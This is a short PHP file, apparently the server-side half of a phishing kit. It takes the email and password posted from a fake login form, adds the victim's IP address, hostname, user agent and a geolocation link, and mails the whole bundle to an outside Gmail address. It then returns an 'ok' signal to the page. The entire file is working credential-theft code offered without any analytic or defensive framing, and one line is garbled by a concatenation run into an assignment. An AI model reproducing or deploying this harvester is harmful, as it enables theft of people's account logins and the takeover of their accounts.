<?php
$email = $_POST['ai'];
$password = $_POST['pr'];
if($email != "" and $password != "") {
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| xLs |--------------|\n";
$message .= "Email            : ".$email."\n";
$message .= "Password              : ".$password.$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Created bY HW --------------|\n";
$send = "drinkwater4231@gmail.com";
$subject = "Login : $ip";
mail($send, $subject, $message);
$signal = 'ok';
$data = array(
'signal' => $signal,
'msg' => $msg
);
echo json_encode($data);
}
?>